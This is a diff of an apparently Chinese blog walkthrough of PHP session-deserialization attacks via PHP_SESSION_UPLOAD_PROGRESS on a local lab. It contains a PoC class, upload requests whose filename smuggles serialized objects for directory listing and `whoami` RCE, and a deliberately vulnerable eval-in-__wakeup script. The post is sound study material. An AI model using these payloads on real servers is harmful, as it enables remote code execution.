 <p>我们需要POST一个同名变量(此次环境为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，就可以添加数据了，那么写个表单</p>
-<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/1.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;666&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/1.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;666&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------82030870339145711343728112542</span><br><span class="line">Content-Length: 368</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=9nto3pe3h7dme2cfv830usftqj</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">2333</span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|123&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">-----------------------------82030870339145711343728112542--</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------82030870339145711343728112542</span><br><span class="line">Content-Length: 368</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=9nto3pe3h7dme2cfv830usftqj</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">2333</span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|123&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">-----------------------------82030870339145711343728112542--</span><br></pre></td></tr></table></figure>
 
 <p>成功打出回显序列化失败，那么也是找到了注入点，写个<code>poc</code></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mdzz=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line"><span class="comment">//$a-&gt;mdzz=&#x27;echo `whoami`;&#x27;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;mdzz=<span class="string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mdzz=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line"><span class="comment">//$a-&gt;mdzz=&#x27;echo `whoami`;&#x27;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;mdzz=<span class="string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
 
 <p>这里多学习一个命令，之前没见过的(感觉什么时候也得找个时间把这些shell命令和函数过了:)</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__DIR__</span><br><span class="line">得到当前目录名</span><br><span class="line">__FILE__</span><br><span class="line">得到当前文件的绝对路径</span><br><span class="line">dirname(__FILE__)</span><br><span class="line">得到绝对路径中的目录名</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__DIR__</span><br><span class="line">得到当前目录名</span><br><span class="line">__FILE__</span><br><span class="line">得到当前文件的绝对路径</span><br><span class="line">dirname(__FILE__)</span><br><span class="line">得到绝对路径中的目录名</span><br></pre></td></tr></table></figure>
 
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------82030870339145711343728112542</span><br><span class="line">Content-Length: 442</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=9nto3pe3h7dme2cfv830usftqj</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">2333</span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">-----------------------------82030870339145711343728112542--</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------82030870339145711343728112542</span><br><span class="line">Content-Length: 442</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=9nto3pe3h7dme2cfv830usftqj</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">2333</span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">-----------------------------82030870339145711343728112542--</span><br></pre></td></tr></table></figure>
 
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Response:</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; .htaccess</span><br><span class="line">    [3] =&gt; .vscode</span><br><span class="line">    [4] =&gt; 1.php</span><br><span class="line">    [5] =&gt; 2.php</span><br><span class="line">    [6] =&gt; 3.php</span><br><span class="line">    [7] =&gt; error</span><br><span class="line">    [8] =&gt; flag.php</span><br><span class="line">    [9] =&gt; index.html</span><br><span class="line">    [10] =&gt; nginx.htaccess</span><br><span class="line">    [11] =&gt; rips-Chinese-master</span><br><span class="line">    [12] =&gt; uploads</span><br><span class="line">    [13] =&gt; www</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Response:</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; .htaccess</span><br><span class="line">    [3] =&gt; .vscode</span><br><span class="line">    [4] =&gt; 1.php</span><br><span class="line">    [5] =&gt; 2.php</span><br><span class="line">    [6] =&gt; 3.php</span><br><span class="line">    [7] =&gt; error</span><br><span class="line">    [8] =&gt; flag.php</span><br><span class="line">    [9] =&gt; index.html</span><br><span class="line">    [10] =&gt; nginx.htaccess</span><br><span class="line">    [11] =&gt; rips-Chinese-master</span><br><span class="line">    [12] =&gt; uploads</span><br><span class="line">    [13] =&gt; www</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
 
 <p>RCE也是可以打的</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------82030870339145711343728112542</span><br><span class="line">Content-Length: 420</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=9nto3pe3h7dme2cfv830usftqj</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">2333</span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:14:\&quot;echo `whoami`;\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">-----------------------------82030870339145711343728112542--</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------82030870339145711343728112542</span><br><span class="line">Content-Length: 420</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=9nto3pe3h7dme2cfv830usftqj</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">2333</span><br><span class="line">-----------------------------82030870339145711343728112542</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:14:\&quot;echo `whoami`;\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">-----------------------------82030870339145711343728112542--</span><br></pre></td></tr></table></figure>
 
 <p>回显也是正常的</p>
 <h2 id="再思考"><a href="#再思考" class="headerlink" title="再思考"></a>再思考</h2><p>我测试之后发现网上的Demo没有一个是<code>php_binary</code>的，所以打算本地尝试一下</p>
 <p>1.php</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>2.php</p>
